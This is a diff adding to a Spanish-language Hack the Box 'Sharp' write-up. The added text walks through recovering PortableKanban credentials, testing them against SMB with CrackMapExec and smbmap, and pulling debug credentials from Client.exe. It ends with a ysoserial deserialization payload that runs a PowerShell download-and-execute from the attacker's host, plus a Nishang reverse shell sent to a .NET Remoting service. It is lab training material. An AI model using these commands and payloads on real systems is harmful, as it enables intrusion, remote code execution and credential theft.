@@ -5,7 +5,7 @@ description: >-
 title: Hack the Box - Sharp Writeup
 date: 2021-05-1 15:40:00 -0600
 categories: [Hack the Box, Writeup]
-tags: [htb, hacking, hack the box, redteam, windows,ysoserial, hard, writeup, kaban, dnsspy, remoting_service, smb, wcf]     # TAG names should always be lowercase
+tags: [htb, hacking, hack the box, redteam, windows,ysoserial, hard, writeup, kaban, dnsspy, remoting_service, smb, wcf, smbget, smbmap, smbmapexec]     # TAG names should always be lowercase
 show_image_post: true
 image: /assets/img/Linux/Sharp/01-Sharp-infocard.png
 ---
@@ -122,10 +122,126 @@ Necesitamos una VM con Windows, pasamos los archivos de Kanban ya descargados.
 Una vez descargado y descomprimido los archivos en nuestro VM Windows, ejecutaremos `PortableKanban.exe` e intentaremos loguearnos como Administrator y con el password vacio, el cual nos da un error. 
 
 ![](/assets/img/Linux/Sharp/kanban_02.png)
- 
-Echemos un vistazo a el archivo de conf: `PortableKanban.pk3` (donde encontramos las credenciales alojadas).
 
+##### Obteniendo las credenciales 
 
+Hay dos posibles formas de obtener las credenciales : 1. Forzando un password reset; 2. Utilizando un script en Python de ExploitDB.
 
+###### Password Reset
 
+Echemos un vistazo a el archivo de conf: `PortableKanban.pk3` (donde encontramos las credenciales alojadas), borramos el contenido o valor del password de Admistrator e intentamos loguearnos con el mismo con el password vacio(blank password), nos saldra un aviso de que se usara el backup de pk3 :).
 
+![](/assets/img/Linux/Sharp/Kanban_03.png)
+
+Bingo, ya estamos logueado el programa.
+
+![](/assets/img/Linux/Sharp/Kanban_04.png)
+
+Encontaremos las credenciales de esta forma:
+
+![](/assets/img/Linux/Sharp/Kanban_05.png)
+
+###### ExploitDB 49409
+
+Descargamos este exploit y simplemente lo ejecutamos
+
+> * [https://www.exploit-db.com/exploits/49409](https://www.exploit-db.com/exploits/49409)
+
+Obtenemos lo siguiente: 
+
+![](/assets/img/Linux/Sharp/Kanban_06.png)
+
+Este exploit nos acorta el tiempo para encontrar el password de administrator
+
+```text
+Administrator:G2@$btRSHJYTarg
+lars:G123HHrth234gRG
+```
+##### Lars como Administrator
+
+Tenemos la siguiente credenciales si solo hacemos el password reset
+
+```text
+Administrator:
+lars:G123HHrth234gRG
+```
+Para volver a Lars como administrator, editamos el archivo pk3 y el pk3.bak, cambios el rol a admin e intentamos loguearnos con las credenciales que acabamos de encontrar
+
+![](/assets/img/Linux/Sharp/Kanban_07.png)
+
+### Enum II
+
+Con las credenciales que obtuvimos, vamos a determinar cuales son validas para usar en SMB, en este caso usaremos `crackmapexe`.
+
+La herramienta la podemos encontrar en la repo de su desarrollador :
+
+> * [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+
+Si usamos Kali Linux, usamos la herramienta de la siguiente forma: `sudo crackmapexec smb 10.10.10.219 -u usernames.txt -p passwords.txt`
+
+En este caso, estoy utilizando Parrot OS, asi que utilizo Poetry directamente del repo de Crackmapexec que lo tengo local.
+
+![](/assets/img/Linux/Sharp/smb_04.png)
+
+Tenemos la siguiente credencial valida:
+
+```text
+Sharp\lars:G123HHrth234gRG
+```
+
+Verificamos con smbmap : `smbmap -u lars -p G123HHrth234gRG -H sharp.htb`
+
+Tenemos permiso de lectura en `dev`
+
+![](/assets/img/Linux/Sharp/smb_05.png)
+
+Utilizamos el parametro `-R` 
+
+![](/assets/img/Linux/Sharp/smb_06.png)
+
+A simple vista nada "interesante", asi que vamos a descargarnos todo el contenido y dejarlo en nuestro VM Windows con `smbget` (tambien podemos conectarnos via OpenVPN a la VM Sharp y descargarnos el contenido directamente).
+
+`smbget -R smb://sharp.htb/dev/ -U lars%G123HHrth234gRG`
+
+Obtenemos los siguientes archivos: 
+
+![](/assets/img/Linux/Sharp/smb_07.png)
+
+### Analizando Client.exe
+
+Analizaremos Client.exe con dnSpy, lo podemos encontrar en el repositorio del desarrollador: 
+
+> * [https://github.com/dnSpy/dnSpy](https://github.com/dnSpy/dnSpy)
+
+Abrimos Client.exe con dnsSpy y encontramos unas credenciales en `remote sample`, a su vez podemos ver que hay un servicio en el puerto `8888` (tal cual vimos en nuestro scan con Nmap) y el path donde se hace el request : `SecretSharpDebugApplicationEndpoint`
+
+Credenciales: 
+
+```text
+Username:debug
+Password:SharpApplicationDebugUserPassword123!
+```
+En el mismo tab podemos observar que Client.exe hace uso de `Remoting.Channel.Tcp`, una busquedad rapida en Google y obtenemos info en Github
+
+> * [https://github.com/tyranid/ExploitRemotingService](https://github.com/tyranid/ExploitRemotingService)
+
+Bastante interesante, vemos que se basa en los siguientes CVE: CVE-2014-1806 o CVE-2014-4149, una busqueda rapida en Vulmon:
+
+> * [https://vulmon.com/vulnerabilitydetails?qid=CVE-2014-1806](https://vulmon.com/vulnerabilitydetails?qid=CVE-2014-1806)
+
+Y encontraremos dos repositorios ya con el exploit compilado.
+
+> * [https://github.com/theralfbrown/ExploitRemotingService-binaries](https://github.com/theralfbrown/ExploitRemotingService-binaries)
+> * [https://github.com/theralfbrown/ExploitRemotingService-binaries](https://github.com/theralfbrown/ExploitRemotingService-binaries)
+
+### RevShell
+
+Para crear nuestro reverse shell, necesitamos tener el siguiente escenario listo:
+
+```text
+1. Un servidor web (con Python resolvemos : python3 -m http.server 8080)
+2. Netcat, en este caso estare utilizando nc64.exe : nc64.exe -nlvp 4444
+3. El reverse shell a utilizar sera el de Nishang, editando el archivo y agregar al final : Invoke-PowerShellTcp -Reverse -IPAddress [Nuestra IP] -Port [Nuestro puerto en escucha]
+4. Dado que la el parametro 'raw' nos permite usar "Send a raw serialized object to the service" :), usaremos Ysoserial de la siguiente manera : ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"
+5. Nuestro Payload seria de esta forma: ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw [nuestro payload generado en Ysoserial]
+```
